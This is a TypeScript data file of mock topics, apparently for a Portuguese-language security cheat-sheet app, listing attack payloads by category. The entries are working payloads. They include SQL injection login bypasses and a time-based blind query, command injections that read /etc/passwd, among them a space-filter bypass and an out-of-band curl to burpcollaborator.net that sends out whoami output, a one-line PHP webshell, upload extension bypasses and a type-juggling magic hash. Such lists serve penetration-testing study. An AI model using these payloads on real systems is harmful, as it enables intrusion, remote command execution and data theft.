export interface Vulnerability {
  id: string;
  title: string;
  scenario: string;
  payload: string;
}

export interface Topic {
  id: string;
  title: string;
  description: string;
  icon: string;
  vulnerabilities: Vulnerability[];
}

export const mockTopics: Topic[] = [
  {
    id: 'sql-injection',
    title: 'SQL Injection',
    description: 'Manipulação de consultas ao banco de dados',
    icon: 'Database', // Will map to a Lucide icon
    vulnerabilities: [
      {
        id: 'sqli-1',
        title: 'Bypass de Login Simples',
        scenario: 'Login form sem sanitização de input',
        payload: "' OR 1=1 --"
      },
      {
        id: 'sqli-2',
        title: 'Time-Based Blind',
        scenario: 'Banco de dados MySQL/MariaDB (Wait for delay)',
        payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1"
      },
      {
        id: 'sqli-3',
        title: 'Auth Bypass (UNION)',
        scenario: 'Formulário que espera username válido e retorna erro caso exista',
        payload: "' UNION SELECT 1, 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--"
      }
    ]
  },
  {
    id: 'command-injection',
    title: 'Command Injection',
    description: 'Execução arbitrária de comandos no SO',
    icon: 'Terminal',
    vulnerabilities: [
      {
        id: 'cmdi-1',
        title: 'Concatenação Simples',
        scenario: 'Input concatenado sem escape a um utilitário (ex: ping)',
        payload: "; cat /etc/passwd"
      },
      {
        id: 'cmdi-2',
        title: 'Bypass de Espaço',
        scenario: 'Filtro que remove espaços no input',
        payload: "${IFS}cat${IFS}/etc/passwd"
      },
      {
        id: 'cmdi-3',
        title: 'Out of Band (OAST)',
        scenario: 'Blind command injection',
        payload: "curl http://burpcollaborator.net/`whoami`"
      }
    ]
  },
  {
    id: 'php-bypasses',
    title: 'PHP Bypasses',
    description: 'Exploração de upload de arquivos e type juggling',
    icon: 'FileCode',
    vulnerabilities: [
      {
        id: 'php-1',
        title: 'Webshell Simples',
        scenario: 'Upload irrestrito com execução de .php',
        payload: "<?php system($_GET['cmd']); ?>"
      },
      {
        id: 'php-2',
        title: 'Bypass de Extensão',
        scenario: 'Filtro simples em extensões comuns',
        payload: "arquivo.php5 / arquivo.phtml / arquivo.pHp"
      },
      {
        id: 'php-3',
        title: 'Type Juggling',
        scenario: 'Uso indevido de == ao invés de === em comparação de hash',
        payload: "0e123456"
      }
    ]
  }
];
